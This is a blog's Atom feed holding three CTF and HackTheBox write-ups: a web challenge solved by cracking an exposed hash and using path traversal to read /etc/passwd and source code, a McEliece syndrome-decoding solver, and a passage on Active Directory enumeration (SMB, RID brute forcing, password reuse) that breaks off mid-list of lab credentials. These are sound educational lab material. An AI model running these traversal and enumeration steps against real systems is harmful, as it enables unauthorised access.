<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.4">Jekyll</generator><link href="https://diogoalexandreoliveiradasilva.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://diogoalexandreoliveiradasilva.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-11-17T22:45:05+00:00</updated><id>https://diogoalexandreoliveiradasilva.github.io/feed.xml</id><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">Pizza Paradise - 1337UP LIVE CTF 2024</title><link href="https://diogoalexandreoliveiradasilva.github.io/blog/2024/PizzaParadise/" rel="alternate" type="text/html" title="Pizza Paradise - 1337UP LIVE CTF 2024"/><published>2024-11-17T22:25:41+00:00</published><updated>2024-11-17T22:25:41+00:00</updated><id>https://diogoalexandreoliveiradasilva.github.io/blog/2024/PizzaParadise</id><content type="html" xml:base="https://diogoalexandreoliveiradasilva.github.io/blog/2024/PizzaParadise/"><![CDATA[<h1 id="pizza-paradise">Pizza Paradise</h1> <p><strong>Author:</strong> p4pa<br/> <strong>Team:</strong> xSTF</p> <h2 id="info">INFO</h2> <ul> <li><strong>CTF:</strong> 1337UP LIVE CTF 2024</li> <li><strong>Challenge:</strong> Pizza Paradise</li> <li><strong>Category:</strong> Web</li> <li><strong>Description:</strong> Something weird going on at this pizza store!</li> </ul> <h2 id="writeup">WriteUP</h2> <h3 id="recon">Recon</h3> <p>We were provided a URL to a pizza store website. Initially, the site seemed entirely static, but I decided to explore further. This was my first web challenge in a CTF competition, so my methods are still evolving—take them with a grain of salt.</p> <p>The first thing I did was open <strong>ZAPROXY</strong> and run an active scan, as I’ve been training with it and am quite liking the tool. <strong>Burp Suite</strong> is also a good option, but I stuck with ZAPROXY for this challenge.</p> <p>The scan returned a few interesting results, including an unlinked page at:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://pizzaparadise.ctf.intigriti.io/secret_172346606e1d24062e891d537e917a90.html
</code></pre></div></div> <p>By checking the server response, I discovered it was a login page with the following JavaScript running:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
    <span class="kd">function</span> <span class="nf">hashPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">CryptoJS</span><span class="p">.</span><span class="nc">SHA256</span><span class="p">(</span><span class="nx">password</span><span class="p">).</span><span class="nf">toString</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">validate</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
        <span class="kd">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">password</span><span class="dl">"</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>

        <span class="kd">const</span> <span class="nx">credentials</span> <span class="o">=</span> <span class="nf">getCredentials</span><span class="p">();</span>
        <span class="kd">const</span> <span class="nx">passwordHash</span> <span class="o">=</span> <span class="nf">hashPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">);</span>

        <span class="k">if </span><span class="p">(</span>
            <span class="nx">username</span> <span class="o">===</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">username</span> <span class="o">&amp;&amp;</span>
            <span class="nx">passwordHash</span> <span class="o">===</span> <span class="nx">credentials</span><span class="p">.</span><span class="nx">passwordHash</span>
        <span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Invalid credentials!</span><span class="dl">"</span><span class="p">);</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div> <p>I tried logging in with some default credentials like <code class="language-plaintext highlighter-rouge">admin:admin</code>, but they didn’t work. I then checked if the <code class="language-plaintext highlighter-rouge">getCredentials()</code> function was defined elsewhere on the site.</p> <p>In the <code class="language-plaintext highlighter-rouge">/assets/js</code> directory, I found an <code class="language-plaintext highlighter-rouge">auth.js</code> file containing:</p> <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">validUsername</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">agent_1337</span><span class="dl">"</span><span class="p">;</span>
<span class="kd">const</span> <span class="nx">validPasswordHash</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac</span><span class="dl">"</span><span class="p">;</span>

<span class="kd">function</span> <span class="nf">getCredentials</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">{</span>
        <span class="na">username</span><span class="p">:</span> <span class="nx">validUsername</span><span class="p">,</span>
        <span class="na">passwordHash</span><span class="p">:</span> <span class="nx">validPasswordHash</span><span class="p">,</span>
    <span class="p">};</span>
<span class="p">}</span>
</code></pre></div></div> <p>With the password hash available, I attempted to crack it. I first tried <strong>CrackStation</strong> (https://crackstation.net/) and got the password <code class="language-plaintext highlighter-rouge">intel420</code>. While I could’ve used <strong>hashcat</strong> or <strong>John the Ripper</strong>, I opted for this faster method.</p> <p>Using the credentials <code class="language-plaintext highlighter-rouge">agent_1337:intel420</code>, I successfully logged in and was redirected to:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
</code></pre></div></div> <p>This page allowed me to download one of four photos.</p> <h3 id="lfi">LFI</h3> <p>Upon inspecting the request, I saw that the photos were downloaded by sending a GET request with the <code class="language-plaintext highlighter-rouge">download</code> parameter:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=%2Fassets%2Fimages%2Ftopsecret1.png</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</code></pre></div></div> <p>This raised a suspicion that the server could be vulnerable to <strong>Local File Inclusion (LFI)</strong>. I followed the methodology I learned from <strong>HackTricks</strong> and tried accessing the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. To do this, I used the <strong>Fuzzing tool</strong> in <strong>ZAPROXY</strong> with this <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI payload list</a> from <strong>SecLists</strong>. However, none of the payloads worked, returning a 200 status with the same content.</p> <p>I took a step back and analyzed the photo download request. It was the only request that actually triggered a download, so I tested the LFI payloads there. I first tried manually adding <code class="language-plaintext highlighter-rouge">../../</code> to the URL <strong>above <code class="language-plaintext highlighter-rouge">/assets/images/</code></strong>, as this was a condition for the LFI vulnerability:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://pizzaparadise.ctf.intigriti.io/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php?download=../../assets/images/
</code></pre></div></div> <p>This returned an error:</p> <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;br</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;b&gt;</span>Notice<span class="nt">&lt;/b&gt;</span>:  readfile(): Read of 8192 bytes failed with errno=21 Is a directory in <span class="nt">&lt;b&gt;</span>/var/www/html/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php<span class="nt">&lt;/b&gt;</span> on line <span class="nt">&lt;b&gt;</span>13<span class="nt">&lt;/b&gt;&lt;br</span> <span class="nt">/&gt;</span>
</code></pre></div></div> <p>This indicated that the server was running on <strong>Linux</strong> and that the file was trying to read a directory. With this information, I proceeded with further fuzzing.</p> <p>I appended <code class="language-plaintext highlighter-rouge">/assets/images/</code> to the LFI payloads and eventually found that the payload:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/assets/images/../../../../../../../../../../../../etc/passwd
</code></pre></div></div> <p>successfully returned the contents of the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file. This confirmed that the server was vulnerable to LFI.</p> <p>To confirm, I tried downloading the PHP file that was serving the page by using this payload:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/assets/images/../../../../../../../../../../../../var/www/html/topsecret_a9aedc6c39f654e55275ad8e65e316b3.php
</code></pre></div></div> <p>This returned the source code of the PHP file, and within the code, I found the flag:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$flag</span> <span class="o">=</span> <span class="s1">'INTIGRITI{70p_53cr37_m15510n_c0mpl373}'</span><span class="p">;</span>
</code></pre></div></div>]]></content><author><name></name></author><category term="ctf"/><category term="web"/><summary type="html"><![CDATA[Writeup for a crypto CTF in 1337UP LIVE CTF 2024]]></summary></entry><entry><title type="html">McEliece Weight Lifting - Hack.lu 2024</title><link href="https://diogoalexandreoliveiradasilva.github.io/blog/2024/McElieceWeightLifting/" rel="alternate" type="text/html" title="McEliece Weight Lifting - Hack.lu 2024"/><published>2024-11-13T19:25:41+00:00</published><updated>2024-11-13T19:25:41+00:00</updated><id>https://diogoalexandreoliveiradasilva.github.io/blog/2024/McElieceWeightLifting</id><content type="html" xml:base="https://diogoalexandreoliveiradasilva.github.io/blog/2024/McElieceWeightLifting/"><![CDATA[<h1 id="mceliece-weight-lifting">McEliece Weight Lifting</h1> <p><strong>Author:</strong> p4pa<br/> <strong>Team:</strong> xSTF</p> <h2 id="info">INFO</h2> <p><strong>CTF:</strong> Hack.lu 2024<br/> <strong>Challenge:</strong> McEliece Weight Lifting<br/> <strong>Category:</strong> Crypto<br/> <strong>Description:</strong> Robert McEliece, our lord and savior of the gym, reveals his flag only after you lift some weights. Given the public key and ciphertext, can you find a correct error vector?</p> <h2 id="writeup">Writeup</h2> <h3 id="analysis">Analysis</h3> <p>First we analyzed the provided source files. Two key files were included:</p> <ul> <li><strong>main.py</strong>: This script interacts with the challenge on an external machine <code class="language-plaintext highlighter-rouge">nc mceliece.flu.xxx 5555</code>. Key functionalities include: <ol> <li>Importing a <strong>public key</strong> from a file.</li> <li>Importing a <strong>syndrome</strong> (the ciphertext), which encodes the encrypted message.</li> <li>Defining parameters specific to the McEliece Cryptosystem, including $n$, $w$, and $t$, crucial for understanding the error-correcting code’s structure and weight.</li> <li>Asks user for an <strong>error vector</strong>, and computes a new <strong>syndrome</strong> using the public key, and checking for a match with the original. If they match, the flag is revealed.</li> </ol> </li> <li><strong>mceliece.py</strong>: This file contains the implementation of the McEliece Cryptosystem, including functions for encoding, encrypting, and generating syndromes.</li> </ul> <h3 id="mceliece-cryptosystem-overview">McEliece Cryptosystem Overview</h3> <p>The McEliece cryptosystem is a public-key encryption scheme based on error-correcting codes. Key components include:</p> <ol> <li><strong>Goppa Codes</strong>: Central to the cryptosystem, Goppa codes are a type of linear error-correcting code designed to facilitate easy error correction while being difficult to decode without the private key.</li> </ol> <p><a href="https://surface.syr.edu/cgi/viewcontent.cgi?article=1846&amp;context=honors_capstone">More on Goppa Codes</a></p> <ol> <li> <p><strong>Encoding and Encryption</strong></p> <ul> <li>Messages are first encoded as a codeword $c = mG$ using a generator matrix $G$, and then an error vector $e$ is added through XOR.</li> <li> <p>The encrypted message (ciphertext) $y$ is defined as:</p> <pre><code class="language-math">  y = c \oplus e = mG \oplus e
</code></pre> </li> <li>Where: <ul> <li>$m $ is the original message in binary vector form.</li> <li>$G$ is the generator matrix of the Goppa code.</li> <li>$e$ is a chosen error vector with a fixed Hamming weight.</li> </ul> </li> </ul> </li> <li> <p><strong>Syndrome</strong>:</p> <ul> <li> <p>The <strong>syndrome</strong> of a ciphertext is computed using the <strong>parity-check matrix</strong> $H$. For a received message $y$, the <strong>syndrome</strong> $s$ is calculated as:</p> <pre><code class="language-math">   s = H \cdot e
</code></pre> </li> <li> <p>Here, $e$ represents the <strong>error vector</strong>. This equation is the key to solve this CTF! Solving this equtation in order of $e$ allows us to unveil the flag.</p> </li> </ul> <p>Reminder that this is just the simplified explanation and I had to spend some time reading: <a href="https://en.wikipedia.org/wiki/McEliece_cryptosystem">This</a> <a href="https://classic.mceliece.org/">and This</a></p> </li> </ol> <h2 id="solution">Solution</h2> <h3 id="formulating-the-problem">Formulating the Problem</h3> <p>We are provided with the <strong>public parity-check matrix</strong> $H$(pubkey) and a <strong>syndrome</strong> vector $s$(cipher). Our goal is to determine the <strong>error vector</strong> $e$:</p> <pre><code class="language-math">H \cdot e = s
</code></pre> <p>where:</p> <ul> <li>$H$ is the known public key matrix.</li> <li>$s$ is the given syndrome (ciphertext).</li> <li>$e$ is the unknown error vector.</li> </ul> <h3 id="setting-up-gaussian-elimination">Setting Up Gaussian Elimination</h3> <table> <tbody> <tr> <td>To solve for $e$, we need to treat the equation $H \cdot e = s$ as a <strong>system of linear equations in binary.</strong> We can set up this equation as an <strong>augmented matrix</strong> $[H</td> <td>s]$ and apply a <strong>Gaussian elimination.</strong>:</td> </tr> </tbody> </table> <ol> <li> <table> <tbody> <tr> <td><strong>Create the Augmented Matrix</strong>: Formulate the augmented matrix $[H</td> <td>s]$.</td> </tr> </tbody> </table> </li> <li><strong>Apply Gaussian Elimination</strong>: Perform row operations using binary arithmetic (mod 2) to transform the matrix into a simpler form, making it easier to find the entries of $e$.</li> <li><strong>Back Substitution</strong>: Once in this simpler form, back-substitute to deduce the values of $e$.</li> </ol> <p>This Gaussian elimination process will return an error vector $e$ that satisfies the equation we wanted to solve $H \cdot e = s$.</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">numpy</span> <span class="k">as</span> <span class="n">np</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">from</span> <span class="n">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>

<span class="c1"># Load the public key and syndrome
</span><span class="n">pk</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">data/pubkey</span><span class="sh">"</span><span class="p">).</span><span class="nf">read_text</span><span class="p">())</span>
<span class="n">H</span><span class="p">,</span> <span class="n">w</span> <span class="o">=</span> <span class="n">pk</span><span class="p">[</span><span class="sh">"</span><span class="s">P</span><span class="sh">"</span><span class="p">],</span> <span class="n">pk</span><span class="p">[</span><span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">]</span>
<span class="n">n</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">H</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>  <span class="c1"># n is the length of the code
</span><span class="n">k</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">H</span><span class="p">)</span>  <span class="c1"># dimension of the code
</span>
<span class="c1"># Load the syndrome (ciphertext)
</span><span class="n">syndrome</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">data/secret.txt.enc</span><span class="sh">"</span><span class="p">).</span><span class="nf">read_text</span><span class="p">())</span>

<span class="c1"># Convert public key and syndrome to numpy arrays
</span><span class="n">P</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">(</span><span class="n">H</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
<span class="n">syndrome_vector</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">array</span><span class="p">(</span><span class="n">syndrome</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>

<span class="c1"># Gaussian elimination function to solve P * e = syndrome
</span><span class="k">def</span> <span class="nf">gaussian_elimination</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">syndrome_vector</span><span class="p">):</span>
    <span class="c1"># Append syndrome as the last column of P (to form an augmented matrix)
</span>    <span class="n">augmented_matrix</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">hstack</span><span class="p">([</span><span class="n">P</span><span class="p">,</span> <span class="n">syndrome_vector</span><span class="p">.</span><span class="nf">reshape</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)])</span>
    <span class="n">rows</span><span class="p">,</span> <span class="n">cols</span> <span class="o">=</span> <span class="n">augmented_matrix</span><span class="p">.</span><span class="n">shape</span>
    
    <span class="c1"># Perform Gaussian elimination
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">min</span><span class="p">(</span><span class="n">rows</span><span class="p">,</span> <span class="n">cols</span><span class="o">-</span><span class="mi">1</span><span class="p">)):</span>
        <span class="c1"># Find the pivot (the first row where we have a 1 in column i)
</span>        <span class="k">if</span> <span class="n">augmented_matrix</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">rows</span><span class="p">):</span>
                <span class="k">if</span> <span class="n">augmented_matrix</span><span class="p">[</span><span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="n">augmented_matrix</span><span class="p">[[</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">]]</span> <span class="o">=</span> <span class="n">augmented_matrix</span><span class="p">[[</span><span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="p">]]</span>  <span class="c1"># Swap rows
</span>                    <span class="k">break</span>
        <span class="c1"># Eliminate all rows below the pivot
</span>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">rows</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">augmented_matrix</span><span class="p">[</span><span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                <span class="n">augmented_matrix</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">augmented_matrix</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">+</span> <span class="n">augmented_matrix</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">2</span>  <span class="c1"># Binary addition
</span>    
    <span class="c1"># Back substitution to find the solution
</span>    <span class="n">error_vector</span> <span class="o">=</span> <span class="n">np</span><span class="p">.</span><span class="nf">zeros</span><span class="p">(</span><span class="n">cols</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">dtype</span><span class="o">=</span><span class="nb">int</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">rows</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">augmented_matrix</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
            <span class="n">error_vector</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">augmented_matrix</span><span class="p">[</span><span class="n">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span>
            <span class="c1"># Subtract the found solution from above rows
</span>            <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
                <span class="k">if</span> <span class="n">augmented_matrix</span><span class="p">[</span><span class="n">j</span><span class="p">,</span> <span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
                    <span class="n">augmented_matrix</span><span class="p">[</span><span class="n">j</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">augmented_matrix</span><span class="p">[</span><span class="n">j</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">error_vector</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">%</span> <span class="mi">2</span>
    
    <span class="k">return</span> <span class="n">error_vector</span>

<span class="c1"># Solve for the error vector using Gaussian elimination
</span><span class="n">error_vector</span> <span class="o">=</span> <span class="nf">gaussian_elimination</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">syndrome_vector</span><span class="p">)</span>

<span class="c1"># Write the error vector to a JSON file
</span><span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">error_vector.json</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">w</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">json</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="n">error_vector</span><span class="p">.</span><span class="nf">tolist</span><span class="p">(),</span> <span class="n">f</span><span class="p">)</span>  <span class="c1"># Convert NumPy array to a list and write as JSON
</span>
<span class="c1"># Check if it matches the syndrome
</span><span class="k">if</span> <span class="n">np</span><span class="p">.</span><span class="nf">array_equal</span><span class="p">(</span><span class="n">np</span><span class="p">.</span><span class="nf">dot</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">error_vector</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span><span class="p">,</span> <span class="n">syndrome_vector</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Success! The error vector is correct.</span><span class="sh">"</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error vector does not match the syndrome.</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div> <p>After identifying the correct error vector, entering it into the challenge interface reveals the flag!</p>]]></content><author><name></name></author><category term="ctf"/><category term="crypto"/><summary type="html"><![CDATA[Writeup for a crypto CTF in Hack.lu 2024]]></summary></entry><entry><title type="html">Cicada - HackTheBox</title><link href="https://diogoalexandreoliveiradasilva.github.io/blog/2024/Cicada/" rel="alternate" type="text/html" title="Cicada - HackTheBox"/><published>2024-11-13T19:25:40+00:00</published><updated>2024-11-13T19:25:40+00:00</updated><id>https://diogoalexandreoliveiradasilva.github.io/blog/2024/Cicada</id><content type="html" xml:base="https://diogoalexandreoliveiradasilva.github.io/blog/2024/Cicada/"><![CDATA[<h1 id="cicada">Cicada</h1> <p><strong>Author:</strong> p4pa<br/> <strong>Platform:</strong> Hack The Box (Easy)</p> <h2 id="reconnaissance">Reconnaissance</h2> <h3 id="nmap">NMAP</h3> <p>Starting with <strong>Nmap</strong>, I scanned the target to identify any open ports and services. This would guide my initial approach, helping me focus on the services that might allow further access.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-Pn</span> 10.10.11.35
</code></pre></div></div> <p>This scan revealed a range of open ports, suggesting a <strong>Windows environment</strong> with possible Active Directory (AD) involvement, given the presence of SMB, LDAP, and Kerberos ports:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE
53/tcp   open  domain            <span class="c"># DNS</span>
88/tcp   open  kerberos-sec      <span class="c"># Kerberos</span>
135/tcp  open  msrpc             <span class="c"># RPC</span>
139/tcp  open  netbios-ssn       <span class="c"># NetBIOS</span>
389/tcp  open  ldap              <span class="c"># LDAP</span>
445/tcp  open  microsoft-ds      <span class="c"># SMB</span>
464/tcp  open  kpasswd5          <span class="c"># Kerberos password change</span>
593/tcp  open  http-rpc-epmap    <span class="c"># HTTP RPC endpoint mapper</span>
3268/tcp open  globalcatLDAP     <span class="c"># Global Catalog LDAP</span>
3269/tcp open  globalcatLDAPssl  <span class="c"># Global Catalog LDAP over SSL</span>
</code></pre></div></div> <p>To gain more insight, I ran an <strong>Nmap service scan</strong> on these ports, aiming to detect version details and confirm any AD clues.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p</span> 53,88,135,389,445,464,593,3268,3269 <span class="nt">-sV</span> 10.10.11.35 <span class="nt">-Pn</span>
</code></pre></div></div> <hr/> <h3 id="ldap-and-smb">LDAP and SMB</h3> <p>I started with <strong>LDAP</strong> as it can sometimes allow anonymous binding, giving access to AD information. Here, however, <strong>anonymous bind was denied</strong>, indicating that authentication was required.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-H</span> ldap://10.10.11.35:389 <span class="nt">-x</span>
</code></pre></div></div> <p>Next, I explored <strong>SMB</strong>. Using <code class="language-plaintext highlighter-rouge">smbclient</code>, I listed available shares and tried accessing them without credentials. This worked for several shares, but only <strong>HR</strong> allowed anonymous access.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-L</span> //10.10.11.35 <span class="nt">-N</span>
</code></pre></div></div> <p>Listing the contents of <code class="language-plaintext highlighter-rouge">HR</code>, I found a file called <em>“Notice from HR.txt”</em>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> <span class="nb">ls
</span>Notice from HR.txt
</code></pre></div></div> <p>Opening it revealed what appeared to be <strong>default credentials</strong> for new hires:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Your default password is: Cicada$M6Corpb*@Lp#nZp!8
</code></pre></div></div> <p>This was promising, as it implied we might have found a valid <strong>AD account credential</strong>.</p> <h3 id="rpc-enumeration">RPC Enumeration</h3> <p>With this initial password in hand, I turned to <strong>RPC</strong>. First, I attempted <strong>anonymous enumeration</strong> via <code class="language-plaintext highlighter-rouge">rpcclient</code>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.10.11.35
</code></pre></div></div> <p>However, I didn’t have the required permissions for user enumeration as an anonymous user. Using the <strong>default HR credentials</strong>, I was able to log in successfully, though I still couldn’t enumerate all users without higher permissions.</p> <h3 id="http-and-rpc-endpoint-analysis">HTTP and RPC Endpoint Analysis</h3> <p>The <strong>HTTP endpoint on port 593</strong> was notable as it provided <strong>RPC over HTTP</strong>—an older service that can sometimes leak endpoint information. Running a scan revealed multiple endpoints, including:</p> <ul> <li><strong>LiveIdSvc RPC</strong> - potentially related to Microsoft account authentication.</li> <li><strong>Group Policy RPC Interface</strong> - could be useful if it holds misconfigured policies.</li> <li><strong>MS NT Directory DRS Interface</strong> - ties into AD replication, hinting that this machine might indeed be a domain controller.</li> </ul> <hr/> <h2 id="smb-user-enumeration-with-nxc">SMB User Enumeration with NXC</h2> <p>At this point, I reached out to a friend (<a href="https://github.com/Co3lho22">Co3lho</a>) who recommended <strong>NXC</strong>, a helpful tool for SMB enumeration, especially within AD environments. NXC’s <strong>RID-brute</strong> functionality can reveal domain users by brute-forcing their relative IDs (RIDs).</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb <span class="nt">-u</span> <span class="s1">'asdf'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--rid-brute</span> 20000 10.10.11.35
</code></pre></div></div> <p>The enumeration yielded several accounts, including <strong>michael.wrightson</strong>. I attempted to log in using the <strong>HR default password</strong>:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nxc smb 10.10.11.35 <span class="nt">-u</span> <span class="s1">'michael.wrightson'</span> <span class="nt">-p</span> <span class="s1">'Cicada$M6Corpb*@Lp#nZp!8'</span>
</code></pre></div></div> <p>After gaining access with Michael’s credentials, I used <strong>NXC to enumerate other users</strong>. This resulted in the discovery of <strong>David Orelious’s credentials</strong>:</p> <ul> <li>Username: <code class="language-plaintext highlighter-rouge">david.orelious</code></li> <li>Password: <code class="language-plaintext highlighter-rouge">aRt$Lp#7t*VQ!3</code></li> </ul> <p>Testing David’s login on SMB, I found he had access to a <strong>DEV share</strong>, where I discovered a <strong>backup script</strong>. Reviewing this script yielded even more credentials:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>emily.oscars
Q!3@Lp#M6b*7t*Vt
